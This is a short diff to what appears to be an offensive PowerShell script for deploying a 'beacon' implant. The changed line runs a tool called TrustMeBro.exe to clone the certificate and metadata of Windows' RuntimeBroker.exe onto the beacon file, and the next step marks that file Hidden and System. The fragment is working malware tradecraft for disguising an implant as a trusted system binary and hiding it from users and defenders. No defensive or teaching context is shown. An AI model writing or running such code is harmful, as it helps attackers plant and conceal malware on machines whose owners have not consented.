@@ -118,7 +118,7 @@ if (-not (Test-Path $BeaconPath)) {
     
     if ((Test-Path $BeaconPath) -and (Test-Path "$TempDir\TrustMeBro.exe")) {
         Write-Host "    -> Cloning Certificate and Metadata using TrustMeBro..."
-        Start-Process -FilePath "$TempDir\TrustMeBro.exe" -ArgumentList "--source C:\Windows\System32\RuntimeBroker.exe --target `"$BeaconPath`" --clone" -NoNewWindow -Wait -ErrorAction SilentlyContinue
+        Start-Process -FilePath "$TempDir\TrustMeBro.exe" -ArgumentList "--clone C:\Windows\System32\RuntimeBroker.exe `"$BeaconPath`"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
         
         Write-Host "    -> Setting Hidden and System attributes on Beacon..."
         Set-ItemProperty -Path $BeaconPath -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
